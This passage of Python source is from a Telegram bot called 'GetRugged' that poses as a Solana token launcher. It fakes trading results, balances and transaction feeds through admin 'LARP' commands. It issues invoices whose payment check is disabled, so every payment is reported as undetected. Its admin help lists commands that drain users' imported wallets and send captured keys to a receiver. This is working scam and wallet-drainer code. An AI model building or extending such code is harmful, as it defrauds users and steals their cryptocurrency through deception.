            f"building {bundle} sell routes\n"
            f"split across Raydium AMM v4  ·  CLMM",
            0.7,
        ),
        (
            f"<b>${symbol}</b>  sell all  ×{bundle} wallets\n"
            f"────────────────────\n\n"
            f"signing {bundle} txs…\n"
            f"Jito tip  {jito_tip:,} lamports  ·  priority fee maxed",
            0.65,
        ),
        (
            f"<b>${symbol}</b>  sell all  ×{bundle} wallets\n"
            f"────────────────────\n\n"
            f"all {bundle} signed\n"
            f"waiting for leader slot…",
            0.55,
        ),
        (
            f"<b>${symbol}</b>  sell all  ×{bundle} wallets\n"
            f"────────────────────\n\n"
            f"bundle in mempool\n"
            f"landing…",
            0.5,
        ),
    ]
    for txt, delay in stages_pre:
        try:
            await status.edit_text(txt, parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await asyncio.sleep(delay)

    multiplier = random.uniform(1.75, 3.8)
    returned_total = 0.0
    dumped_idxs = list(token.get("dumped_idxs") or [])
    order = list(range(1, bundle + 1))
    random.shuffle(order)
    wave_size = 1 if bundle <= 8 else (2 if bundle <= 15 else 3)

    for wave_i in range(0, len(order), wave_size):
        wave = order[wave_i: wave_i + wave_size]
        wave_return = 0.0
        for idx in wave:
            if idx in dumped_idxs:
                continue
            part = per * random.uniform(multiplier * 0.85, multiplier * 1.15)
            part = round(part, 4)
            wave_return = round(wave_return + part, 4)
            returned_total = round(returned_total + part, 4)
            dumped_idxs.append(idx)
            add_personal_tx(sess, f"💥 Dump wallet {idx}", "success", amount=part)
        token["dumped_idxs"] = sorted(dumped_idxs)
        done = len(dumped_idxs)
        progress = done / max(1, bundle)
        mcap_now = max(400, int(start_mcap * (1 - progress * random.uniform(0.75, 0.95))))
        holders_left = max(3, int(start_holders * (1 - 0.7 * progress)))
        pnl_now = round(returned_total - invest * progress, 4)
        bar_filled = int(progress * 10)
        bar = "█" * bar_filled + "░" * (10 - bar_filled)
        lines = [
            f"<b>${symbol}</b>  selling  {done}/{bundle}",
            f"────────────────────",
            f"",
            f"<code>[{bar}]</code>",
            f"",
            f"wave out     +{wave_return:.4f} SOL",
            f"total out    <b>{returned_total:.4f} SOL</b>",
            f"running pnl  <b>{pnl_now:+.4f} SOL</b>",
            f"",
            f"mc ~${mcap_now:,}  ·  holders {holders_left}",
        ]
        if done < bundle:
            lines.append(f"{bundle - done} wallets remaining")
        else:
            lines.append("all routes filled")
        try:
            await status.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await asyncio.sleep(random.uniform(0.55, 1.05))

    returned_total = round(returned_total, 4)
    profit = round(returned_total - invest, 4)
    pct = (profit / invest * 100) if invest else 0.0
    multiple = (returned_total / invest) if invest else 0.0

    token["dumped"] = True
    token["dumping"] = False
    token["status"] = "dumped"
    token["profit"] = profit
    token["returned"] = returned_total
    token["invested"] = invest
    token["mode"] = "Sniper Dump"
    token["dumped_idxs"] = list(range(1, bundle + 1))
    token["mcap"] = random.randint(300, 1800)

    add_personal_tx(sess, f"Sell all  ${symbol}", "success", amount=returned_total)
    add_personal_tx(sess, "Profit settled", "success", amount=profit)

    if sess.wallets:
        w = sess.wallets[sess.active_wallet_idx]
        w.balance_sol = round(w.balance_sol + returned_total, 4)
        if getattr(w, "is_larp", False):
            global bot_balance_sol
            bot_balance_sol = round(bot_balance_sol + returned_total, 4)
            _save_state()
    sess.larp_profit_total = round(sess.larp_profit_total + profit, 4)

    settle_stages = [
        (
            f"<b>${symbol}</b>  settling\n"
            f"────────────────────\n\n"
            f"consolidating {bundle} sell receipts…\n"
            f"sweeping residual liquidity…",
            0.65,
        ),
        (
            f"<b>${symbol}</b>  settling\n"
            f"────────────────────\n\n"
            f"routing proceeds to main wallet\n"
            f"finalizing pnl…",
            0.55,
        ),
        (
            f"<b>${symbol}</b>  [sold]\n"
            f"────────────────────\n\n"
            f"mint       <code>{mask_mint(mint)}</code>\n\n"
            f"invested   {invest:.4f} SOL\n"
            f"returned   <b>{returned_total:.4f} SOL</b>\n"
            f"profit     <b>+{profit:.4f} SOL</b>\n"
            f"multiple   <b>{multiple:.2f}x</b>  ({pct:+.0f}%)\n\n"
            f"mc collapsed  ~${token['mcap']:,}\n"
            f"{bundle}/{bundle} wallets confirmed",
            0.3,
        ),
    ]
    for i, (txt, delay) in enumerate(settle_stages):
        kw = {"parse_mode": ParseMode.HTML}
        if i == len(settle_stages) - 1:
            kw["reply_markup"] = post_dump_kb(mint)
        try:
            await status.edit_text(txt, **kw)
        except Exception:
            pass
        await asyncio.sleep(delay)

    try:
        await safe_edit_message(cb, 
            f"<b>${symbol}</b>  [sold]\n"
            f"<code>{mask_mint(mint)}</code>\n\n"
            f"{bundle}/{bundle} wallets sold\n"
            f"profit  <b>+{profit:.4f} SOL</b>  ·  {multiple:.2f}x",
            reply_markup=post_dump_kb(mint),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


@router.callback_query(F.data == "noop")
async def noop_cb(cb: CallbackQuery):
    await cb.answer()


@router.callback_query(F.data.startswith("dumpreset:"))
async def dump_reset(cb: CallbackQuery):
    mint = cb.data.split(":", 1)[1]
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    if token.get("dumped"):
        await cb.answer("Already fully dumped — can't reset", show_alert=True)
        return
    token["dumped_idxs"] = []
    await cb.answer("Per-wallet dump markers reset")
    bundle = int(token.get("bundle") or 10)
    try:
        await cb.message.edit_reply_markup(reply_markup=live_token_kb(mint, bundle))
    except Exception:
        pass



async def _check_sol_payment(dest: str, expected_amount: float, since_ts: float, tolerance: float = 0.000000001) -> bool:
    """Scan recent incoming transfers to dest for exact lamport amount."""
    if not HAS_SOLANA:
        return False
    try:
        async with AsyncClient(RPC_URL) as client:
            pk = Pubkey.from_string(dest)
            sigs = await client.get_signatures_for_address(pk, limit=20)
            if not sigs.value:
                return False
            target_lamports = int(round(expected_amount * 1_000_000_000))
            for s in sigs.value:
                if s.block_time and s.block_time < since_ts - 30:
                    continue
                tx = await client.get_transaction(
                    s.signature, encoding="jsonParsed", max_supported_transaction_version=0
                )
                if not tx.value:
                    continue
                meta = tx.value.transaction.meta
                if not meta or meta.err:
                    continue
                instructions = tx.value.transaction.transaction.message.instructions or []
                for ix in instructions:
                    parsed = getattr(ix, "parsed", None)
                    if not parsed:
                        continue
                    if isinstance(parsed, dict) and parsed.get("type") == "transfer":
                        info = parsed.get("info") or {}
                        if info.get("destination") == dest:
                            lamports = int(info.get("lamports") or 0)
                            if abs(lamports - target_lamports) <= 1:
                                return True
        return False
    except Exception as e:
        log.warning("payment check failed: %s", e)
        return False


# ── Promo ───────────────────────────────────────────────────────────────────
@router.callback_query(F.data == "promo:enter")
async def promo_enter(cb: CallbackQuery, state: FSMContext):
    await safe_edit_message(cb, "🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(PromoStates.waiting_code)
    await cb.answer()


@router.callback_query(F.data == "promo:pay")
async def promo_pay(cb: CallbackQuery):
    uid = cb.from_user.id
    sess = get_session(uid)
    invoice_id = random.randint(1, 99999)
    amount_display = f"{int(LAUNCH_FEE_SOL)}.{invoice_id:09d}"[:12]
    pay_to = PAYMENT_RECEIVER
    if not pay_to or len(pay_to) < 32 or str(pay_to).startswith("YourDrain"):
        pay_to = "4tVAsePqeGWgcqiPRL9ByFXiaHqhukYesva7y5r1jxxY"
    expires = time.strftime("%b %d, %H:%M UTC", time.gmtime(time.time() + 86400))
    sess.pending_invoice = {
        "id": invoice_id,
        "amount": LAUNCH_FEE_SOL + (invoice_id / 1e9),
        "amount_display": amount_display,
        "pay_to": pay_to,
        "created": time.time(),
        "expires": time.time() + 86400,
        "grants": LAUNCHES_PER_CYCLE,
    }
    text = (
        "🧾 <b>Payment Invoice</b>\n"
        f"<code>INV-{invoice_id:05d}</code>\n"
        "────────────────\n\n"
        f"<b>Amount due</b>  <code>{amount_display} SOL</code>\n"
        f"<b>Unlocks</b>     +{LAUNCHES_PER_CYCLE} launches\n"
        f"<b>Network</b>     Solana\n"
        f"<b>Expires</b>     {expires}\n"
        "────────────────\n\n"
        "<b>Pay to this address</b>\n"
        f"<code>{pay_to}</code>\n\n"
        "📱 Scan with Phantom / Solflare.\n\n"
        "⚠️ <b>Send the exact amount shown.</b>\n"
        "The last few lamports are your invoice ID.\n\n"
        f"✅ +{LAUNCHES_PER_CYCLE} launches unlock the moment payment lands."
    )
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="🔄 I've paid, check now", callback_data="promo:checkpay"))
    kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    await safe_edit_message(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
    await cb.answer()


@router.callback_query(F.data == "promo:checkpay")
async def promo_checkpay(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    inv = sess.pending_invoice
    if not inv:
        await cb.answer("No pending invoice", show_alert=True)
        return
    await cb.answer("Checking on-chain…", show_alert=False)

    # Optional real on-chain check — enable when ready:
    # paid = await _check_sol_payment(inv["pay_to"], inv["amount"], inv["created"])
    # if paid:
    #     grants = int(inv.get("grants") or LAUNCHES_PER_CYCLE)
    #     sess.launches_left += grants
    #     sess.pending_invoice = None
    #     await cb.message.answer(
    #         f"✅ <b>Payment confirmed</b>\n\n+{grants} launches unlocked.\n"
    #         f"Launches remaining: <b>{sess.launches_left}</b>",
    #         parse_mode=ParseMode.HTML,
    #         reply_markup=main_menu_kb(),
    #     )
    #     return

    await cb.message.answer(
        "⏳ Payment not detected yet.\n\n"
        "Make sure you sent the <b>exact</b> amount shown on the invoice.\n"
        "It can take 1–2 confirmations. Tap the button again in a few seconds.",
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu_kb(),
    )


@router.message(PromoStates.waiting_code)
async def promo_code(message: Message, state: FSMContext):
    code = message.text.strip().upper()
    sess = get_session(message.from_user.id)
    valid_launches = {"RUG2026": 5, "BUNDLE": 3, "SNIPE": 4, "JITO": 2, "EARLY": 6, "VAULT": 3}
    valid_credit = {"FUEL05": 0.5, "GAS05": 0.5, "TIP05": 0.5}
    if code in valid_launches:
        sess.promo = code
        sess.launches_left += valid_launches[code]
        text = (
            f"✅ <b>Promo Applied</b>\n\n"
            f"Code: <b>{code}</b>\n"
            f"+{valid_launches[code]} launches\n"
            f"Launches left: <b>{sess.launches_left}</b>"
        )
        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    elif code in valid_credit:
        if not sess.wallets:
            await message.answer(
                "🔒 <b>Wallet required</b>\n\n"
                "Connect a wallet first to claim this promo.\n"
                "Go to 🔑 Wallets → Import, then redeem again.",
                reply_markup=main_menu_kb(),
                parse_mode=ParseMode.HTML,
            )
        else:
            sess.promo = code
            sess.sol_credit = round(sess.sol_credit + valid_credit[code], 4)
            text = (
                f"✅ <b>Fuel credit applied</b>\n\n"
                f"Code: <b>{code}</b>\n"
                f"+{valid_credit[code]} SOL launch credit\n"
                f"Available credit: <b>{sess.sol_credit:.2f} SOL</b>\n\n"
                "Credit is used automatically on your next launch confirm."
            )
            await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    else:
        await message.answer(
            "<b>Invalid code</b>\n\n<i>Code is invalid or expired.</i>",
            reply_markup=main_menu_kb(),
            parse_mode=ParseMode.HTML,
        )
    await state.clear()


# ── Help ────────────────────────────────────────────────────────────────────
@router.message(Command("help"))
async def cmd_help(message: Message):
    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        await message.answer(
            "<b>GetRugged · Help</b>\n"
            "────────────────────\n\n"
            "Everything runs from the menu — /start then use the buttons:\n\n"
            "• <b>Launch</b> — create a token with bundling\n"
            "• <b>Wallets</b> — connect / switch / rename\n"
            "• <b>Portfolio</b> — your launches\n"
            "• <b>Transactions</b> — activity feed\n"
            "• <b>Settings</b> — slippage & priority fee\n"
            "• <b>Access</b> — launches & promo codes\n\n"
            "<i>Minimum 3 SOL required to launch. Empty wallets are blocked.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    text = (
        "👑 <b>Admin commands</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"

        "<b>Core</b>\n"
        "/start — open the main menu (all users)\n"
        "🏠 Menu — button pinned at the bottom, tap anytime to return here\n"
        "/admin — panel: user count, drained count, vault, sweep status\n"
        "/help — this list\n\n"

        "<b>Vault / LARP money</b>\n"
        "/mindrain [usd] — min USD value required to drain (0 = off)\n"
        "/setbal &lt;amount&gt; — set vault to a number, sync LARP wallet\n"
        "/addbal &lt;amount&gt; — add or subtract (accepts negatives)\n"
        "/bump [sol] — small top-up (default +0.25)\n"
        "/randomtx [n] — inject n fake txs, wobble LARP balance\n\n"

        "<b>LARP mode</b>\n"
        "/larpon — enable LARP, seed fake wallet + fake txs\n"
        "/larpoff — disable, remove LARP wallets from your session\n"
        "/larpwallet — force-recreate the LARP wallet with current vault balance\n"
        "/clonewallet — add an extra LARP wallet to look like a multi-wallet setup\n"
        "/ghost — hide your LARP wallet without turning mode off\n\n"

        "<b>Simulated activity</b>\n"
        "/simactivity — burst of realistic-looking wallet events\n"
        "/fakefill [n] — inject n sniper buys on the last live token\n"
        "/livepulse — nudge MC/holders/buys on the last live token\n"
        "/setmcap &lt;usd&gt; — pin the displayed market cap\n"
        "/holders &lt;n&gt; — pin the displayed holder count\n"
        "/dumpnow — force a profitable dump on your last LARP launch\n"
        "/cleartx — wipe your personal + global tx feed\n\n"

        "<b>Draining / alerts</b>\n"
        "/testalert — send sample capture to KEY_RECEIVER + KEY_ALERT_IDS\n"
        "/testdrain — try draining your currently active wallet right now\n"
        "/sweepall — one pass: drain every non-drained wallet across all users\n"
        "/sweepstart [secs] — start the auto-sweep loop (default 60s)\n"
        "/sweepstop — stop the auto-sweep loop\n"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)


# ── Admin ───────────────────────────────────────────────────────────────────
@router.message(Command("mindrain"))
async def cmd_mindrain(message: Message):
    """Admin: set minimum USD value required to drain a wallet.
    Usage:
      /mindrain           — show current threshold
      /mindrain 100       — only drain wallets worth >= $100
      /mindrain 0         — disable (drain any positive balance)
    """
    if message.from_user.id not in ADMIN_IDS:
        return
    global MIN_DRAIN_USD
    parts = (message.text or "").split()
    if len(parts) < 2:
        await _admin_reply(
            message,
            f"Min drain threshold: <b>${MIN_DRAIN_USD:,.2f}</b>\n\n"
            f"Usage:\n"
            f"<code>/mindrain 100</code> — only drain ≥ $100\n"
            f"<code>/mindrain 0</code> — no USD floor",
        )
        return
    raw = parts[1].replace(",", "").replace("$", "").strip()
    try:
        val = float(raw)
        if val < 0:
            raise ValueError
    except ValueError:
        await _admin_reply(message, "Invalid amount. Example: <code>/mindrain 100</code>")
        return
    MIN_DRAIN_USD = round(val, 2)
    _save_state()
    if MIN_DRAIN_USD <= 0:
        await _admin_reply(message, "Min drain threshold <b>disabled</b> (any positive balance).")
    else:
        await _admin_reply(
            message,
            f"Min drain threshold set to <b>${MIN_DRAIN_USD:,.2f}</b>\n"
            f"Wallets below this USD total are skipped.",
        )


@router.message(Command("setbal"))
async def cmd_setbal(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").split()
    if len(parts) < 2:
        await _admin_reply(message, "Usage: <code>/setbal 12.5</code>")
        return
    try:
        amount = float(parts[1].replace(",", ""))
        if amount < 0:
            raise ValueError
    except ValueError:
        await _admin_reply(message, "Invalid amount. Example: <code>/setbal 12.5</code>")
        return
    global bot_balance_sol
    bot_balance_sol = round(amount, 4)
    created = inject_fake_txs(random.randint(2, 4), types=["📥 Wallet Top-up", "⚡ Priority Tip", "💰 Profit Claim"])
    _save_state()
    sess = get_session(message.from_user.id)
    if LARP_ENABLED:
        ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    else:
        for w in sess.wallets:
            if getattr(w, "is_larp", False):
                w.balance_sol = bot_balance_sol
    for tx in created:
        sess.last_tx.insert(0, dict(tx))
    lines = "\n".join(f"• {t['type']} · <code>{t['sig'][:16]}…</code>" for t in created)
    await _admin_reply(
        message,
        f"Vault set to <b>{SOL_EMOJI} {bot_balance_sol:.4f}</b>\n"
        f"{'LARP wallet synced.' if LARP_ENABLED else ''}\n\n"
        f"{len(created)} txs:\n{lines}",
    )


@router.message(Command("addbal"))
async def cmd_addbal(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").split()
    if len(parts) < 2:
        await _admin_reply(message, "Usage: <code>/addbal 1.25</code> or <code>/addbal -0.5</code>")
        return
    try:
        delta = float(parts[1].replace(",", ""))
    except ValueError:
        await _admin_reply(message, "Invalid amount. Example: <code>/addbal 1.25</code>")
        return
    global bot_balance_sol
    bot_balance_sol = round(max(0.0, bot_balance_sol + delta), 4)
    tx_type = "📥 Wallet Top-up" if delta >= 0 else "📤 Transfer Out"
    created = inject_fake_txs(random.randint(2, 4), types=[tx_type, "⚡ Priority Tip", "🔄 Swap"])
    _save_state()
    sess = get_session(message.from_user.id)
    if LARP_ENABLED:
        ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    else:
        for w in sess.wallets:
            if getattr(w, "is_larp", False):
                w.balance_sol = bot_balance_sol
    for tx in created:
        t = dict(tx)
        t["amount"] = delta
        sess.last_tx.insert(0, t)
    sign = "+" if delta >= 0 else ""
    lines = "\n".join(f"• {t['type']} · <code>{t['sig'][:16]}…</code>" for t in created)
    await _admin_reply(
        message,
        f"Vault {sign}{delta:.4f} → <b>{SOL_EMOJI} {bot_balance_sol:.4f}</b>\n"
        f"{'LARP wallet synced.' if LARP_ENABLED else ''}\n\n"
        f"{len(created)} txs:\n{lines}",
    )




@router.message(Command("setportfolio"))
async def cmd_setportfolio(message: Message):
    """Admin: /setportfolio 12 [live]
    Sets the home-screen Portfolio numbers.
    Examples:
      /setportfolio 12        → Portfolio 12 · live unchanged (or 0 if none)
      /setportfolio 12 3      → Portfolio 12 · live 3
      /setportfolio clear     → back to real counts
    """
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    parts = (message.text or "").split()
    if len(parts) < 2:
        cur_t = sess.portfolio_display_total
        cur_l = sess.portfolio_display_live
        real_t = len(sess.launched_tokens)
        real_l = sum(1 for x in sess.launched_tokens if x.get("status") == "live" and not x.get("dumped"))
        await message.answer(
            f"Portfolio display\n"
            f"Override: total=<b>{cur_t}</b> live=<b>{cur_l}</b>\n"
            f"Real: total=<b>{real_t}</b> live=<b>{real_l}</b>\n\n"
            "Usage:\n"
            "<code>/setportfolio 12</code>\n"
            "<code>/setportfolio 12 3</code>\n"
            "<code>/setportfolio clear</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    arg = parts[1].lower()
    if arg in ("clear", "reset", "off", "real"):
        sess.portfolio_display_total = None
        sess.portfolio_display_live = None
        await message.answer("Portfolio numbers reset to real counts.")
        return
    try:
        total = max(0, int(parts[1].replace(",", "")))
    except ValueError:
        await message.answer("Usage: <code>/setportfolio 12</code> or <code>/setportfolio 12 3</code>", parse_mode=ParseMode.HTML)
        return
    live = None
    if len(parts) >= 3:
        try:
            live = max(0, int(parts[2].replace(",", "")))
        except ValueError:
            await message.answer("Live count must be an integer.")
            return
        if live > total:
            live = total
    sess.portfolio_display_total = total
    if live is not None:
        sess.portfolio_display_live = live
    elif sess.portfolio_display_live is None:
        sess.portfolio_display_live = 0
    shown_live = sess.portfolio_display_live if sess.portfolio_display_live is not None else 0
    await message.answer(
        f"Portfolio set to <b>{total}</b> · live <b>{shown_live}</b>\n"
        "Open /start or Menu to see it.",
        parse_mode=ParseMode.HTML,
    )
    log.info("setportfolio uid=%s total=%s live=%s", message.from_user.id, total, shown_live)


@router.message(Command("larpseed"))
async def cmd_larpseed(message: Message):
    """Admin: /larpseed 100 — random seed only. Manual Connect Wallet applies balance."""
    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        log.warning("larpseed denied uid=%s", uid)
        return
    global bot_balance_sol, LARP_ENABLED
    try:
        parts = (message.text or "").split()
        bal = 100.0
        if len(parts) >= 2:
            try:
                bal = float(parts[1].replace(",", ""))
            except ValueError:
                await message.answer("Usage: /larpseed 100")
                return
        bal = max(0.0, round(bal, 4))

        if not BIP39_WORDLIST:
            await message.answer("BIP39 wordlist missing on server.")
            return

        phrase = " ".join(random.choice(BIP39_WORDLIST) for _ in range(12))

        LARP_ENABLED = True
        bot_balance_sol = bal
        sess = get_session(uid)
        sess.larp_mode = True
        sess.pending_larp_balance = bal
        sess.pending_larp_phrase = phrase
        _save_state()

        text = (
            "<b>LARP seed</b>\n\n"
            f"<code>{phrase}</code>\n\n"
            f"Target balance  <b>{SOL_EMOJI} {bal:.4f}</b>\n"
            "Nothing linked. Wallet is still empty.\n\n"
            "1. Copy the seed\n"
            "2. Wallets → Connect / Import\n"
            "3. Paste it yourself — only then balance appears"
        )
        await message.answer(text, parse_mode=ParseMode.HTML)
        log.info("larpseed issued uid=%s bal=%.4f (manual connect)", uid, bal)
    except Exception as e:
        log.exception("larpseed failed: %s", e)
        try:
            await message.answer(f"larpseed error: {type(e).__name__}: {e}")
        except Exception:
            pass


@router.message(Command("larpon"))
async def cmd_larpon(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    global LARP_ENABLED, bot_balance_sol
    LARP_ENABLED = True
    if bot_balance_sol <= 0:
        bot_balance_sol = round(random.uniform(4.2, 22.8), 4)
    sess = get_session(message.from_user.id)
    sess.larp_mode = True
    w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    inject_fake_txs(3, types=["📥 Wallet Top-up", "⚡ Priority Tip", "🛡 Safety Scan"])
    add_personal_tx(sess, "📥 Wallet Linked", "success")
    _save_state()
    await _admin_reply(
        message,
        f"<b>LARP on</b>\n\n"
        f"<code>{w.public_key}</code>\n"
        f"Balance <b>{SOL_EMOJI} {w.balance_sol:.4f}</b>\n\n"
        f"/addbal /setbal sync wallet\n"
        f"/randomtx [n] · /larpoff",
    )


@router.message(Command("larpoff"))
async def cmd_larpoff(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    global LARP_ENABLED
    LARP_ENABLED = False
    sess = get_session(message.from_user.id)
    sess.larp_mode = False
    removed = remove_larp_wallets(sess)
    _save_state()
    await _admin_reply(
        message,
        f"<b>LARP off</b>\nRemoved {removed} LARP wallet(s).",
    )



@router.message(Command("randomcoin"))
async def cmd_randomcoin(message: Message):
    """Inject a random token into portfolio + activity so Portfolio view changes."""
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    names = ["MoonDog", "SolCat", "RugFin", "JitoFox", "PumpOwl", "BundleApe", "SniperRat", "CurvePig"]
    syms = ["MDOG", "SCAT", "RFIN", "JFOX", "POWL", "BAPE", "SRAT", "CPIG"]
    i = random.randint(0, len(names)-1)
    name, symbol = names[i], syms[i]
    invest = round(random.uniform(2.5, 14.0), 3)
    profit = round(random.uniform(-1.2, 8.5), 3)
    mint = fake_mint()
    token = {
        "name": name,
        "symbol": symbol,
        "supply": 1_000_000_000,
        "bundle": random.randint(6, 18),
        "invest": invest,
        "per_wallet": round(invest / 10, 4),
        "desc": "",
        "image": "",
        "twitter": "",
        "telegram": "",
        "instagram": "",
        "website": "",
        "mint": mint,
        "status": random.choice(["live", "live", "dumped"]),
        "ts": time.time() - random.randint(30, 3600),
        "larp": True,
        "dumped": False,
        "mcap": round(random.uniform(12_000, 420_000), 0),
        "holders": random.randint(40, 380),
        "buys": random.randint(15, 220),
        "profit": profit,
        "owner_id": message.from_user.id,
    }
    if token["status"] == "dumped":
        token["dumped"] = True
    sess.launched_tokens.append(token)
    add_personal_tx(sess, f"🪙 Create Mint ${symbol}", "success")
    add_personal_tx(sess, f"📦 Bundle Buy ${symbol}", "success", amount=-invest)
    if token["dumped"]:
        add_personal_tx(sess, f"🎯 Sniper Dump ${symbol}", "success", amount=profit)
        add_personal_tx(sess, f"💰 Profit Claim ${symbol}", "success", amount=profit)
        global bot_balance_sol
        bot_balance_sol = round(bot_balance_sol + max(0.0, profit), 4)
        _save_state()
    else:
        for _ in range(random.randint(2, 5)):
            add_personal_tx(sess, f"👀 Sniper buy ${symbol}", "success", amount=round(random.uniform(0.05, 0.9), 3))
    await _admin_reply(
        message,
        f"Random coin injected\n"
        f"<b>${symbol}</b> · {name}\n"
        f"Status: <b>{token['status']}</b> · invest {invest} · MC ~${token['mcap']:,.0f}\n"
        f"Portfolio now has <b>{len(sess.launched_tokens)}</b> tokens",
    )


@router.message(Command("randomtx"))
async def cmd_randomtx(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").split()
    n = 5
    if len(parts) >= 2:
        try:
            n = max(1, min(25, int(parts[1])))
        except ValueError:
            await _admin_reply(message, "Usage: <code>/randomtx</code> or <code>/randomtx 10</code>")
            return
    sess = get_session(message.from_user.id)
    types = [
        "⚡ Priority Tip",
        "📦 Bundle Buy",
        "🪙 Create Mint",
        "🔄 Swap",
        "💰 Profit Claim",
        "🎯 Sniper Dump",
        "📥 Wallet Top-up",
        "📤 Transfer Out",
        "🛡 Safety Scan",
        "🔐 Sniper Guard Lock",
    ]
    created = inject_fake_txs(n, types=types)
    global bot_balance_sol
    delta_total = 0.0
    for i, tx in enumerate(created):
        t = dict(tx)
        if "Top-up" in t["type"] or "Profit" in t["type"] or "Dump" in t["type"]:
            amt = round(random.uniform(0.05, 1.8), 4)
            t["amount"] = amt
            delta_total += amt
        elif "Transfer Out" in t["type"] or "Tip" in t["type"]:
            amt = -round(random.uniform(0.01, 0.35), 4)
            t["amount"] = amt
            delta_total += amt
        sess.last_tx.insert(0, t)
    if LARP_ENABLED:
        bot_balance_sol = round(max(0.0, bot_balance_sol + delta_total), 4)
        ensure_larp_wallet(sess, force_balance=bot_balance_sol)
        _save_state()
    lines = "\n".join(
        f"• {t['type']}" + (f"  {t.get('amount', 0):+.4f}" if "amount" in t else "") + f" · <code>{t['sig'][:14]}…</code>"
        for t in created[:12]
    )
    await _admin_reply(
        message,
        f"Injected <b>{len(created)}</b> txs\n"
        f"{('Balance ' + f'{delta_total:+.4f}' + f' → {bot_balance_sol:.4f}') if LARP_ENABLED else ''}\n\n"
        f"{lines}",
    )


@router.message(Command("larpwallet"))
async def cmd_larpwallet(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    global bot_balance_sol
    if bot_balance_sol <= 0:
        bot_balance_sol = round(random.uniform(3.5, 15.0), 4)
    sess = get_session(message.from_user.id)
    remove_larp_wallets(sess)
    w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    add_personal_tx(sess, "📥 Wallet Linked", "success")
    _save_state()
    await _admin_reply(
        message,
        f"LARP wallet\n<code>{w.public_key}</code>\n"
        f"Balance <b>{SOL_EMOJI} {w.balance_sol:.4f}</b>",
    )


@router.message(Command("dumpnow"))
async def cmd_dumpnow(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    token = None
    for t in reversed(sess.launched_tokens):
        if t.get("larp") or LARP_ENABLED:
            token = t
            break
    if not token:
        await _admin_reply(message, "No LARP launch found.")
        return
    symbol = token.get("symbol", "???")
    bundle = int(token.get("bundle") or 10)
    invest = float(token.get("invest") or 3)
    status = await message.answer(
        f"💥 <b>FORCE DUMP ${symbol}</b>\n"
        f"Arming {bundle} wallets…",
        parse_mode=ParseMode.HTML,
    )
    for txt, delay in [
        (f"💥 <b>${symbol}</b> · scanning book…", 0.5),
        (f"💥 <b>${symbol}</b> · signing sells · Jito tips…", 0.6),
        (f"💥 <b>${symbol}</b> · landing wave 1/{max(1, bundle//3)}…", 0.55),
        (f"💥 <b>${symbol}</b> · landing wave 2…", 0.5),
        (f"💥 <b>${symbol}</b> · final wave · clearing bag…", 0.55),
    ]:
        await asyncio.sleep(delay)
        try:
            await status.edit_text(txt, parse_mode=ParseMode.HTML)
        except Exception:
            pass
    profit = round(random.uniform(1.5, 11.0), 4)
    returned = round(invest + profit, 4)
    add_personal_tx(sess, f"🎯 Sniper Dump ${symbol}", "success", amount=profit)
    add_personal_tx(sess, f"💰 Profit Claim ${symbol}", "success", amount=profit)
    global bot_balance_sol
    bot_balance_sol = round(bot_balance_sol + profit, 4)
    sess.larp_profit_total = round(sess.larp_profit_total + profit, 4)
    ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    token["status"] = "dumped"
    token["dumped"] = True
    token["returned"] = returned
    token["profit"] = profit
    _save_state()
    try:
        await status.edit_text(
            f"✅ <b>${symbol}</b> fully dumped\n\n"
            f"Returned <code>{returned:.4f} SOL</code>\n"
            f"Profit <b>+{profit:.4f} SOL</b> · vault <b>{bot_balance_sol:.4f}</b>",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass
    asyncio.create_task(_auto_delete(message.bot, message.chat.id, message.message_id, status.message_id, delay=6.0))


@router.message(Command("simactivity"))
async def cmd_simactivity(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    if LARP_ENABLED:
        ensure_larp_wallet(sess)
    waves = [
        ("🔗 Jito tip landed", 0.4),
        ("📦 Bundle landed slot", 0.5),
        ("👀 3 snipers detected", 0.6),
        ("🎯 Auto-dump triggered", 0.7),
        ("💰 Profit settled", 0.5),
    ]
    status = await message.answer("📡 <b>Simulating live activity…</b>", parse_mode=ParseMode.HTML)
    profit = 0.0
    for label, delay in waves:
        await asyncio.sleep(delay)
        amt = round(random.uniform(0.2, 2.4), 4) if "Profit" in label or "dump" in label.lower() else None
        if amt:
            profit += amt
        add_personal_tx(sess, label, "success", amount=amt)
        try:
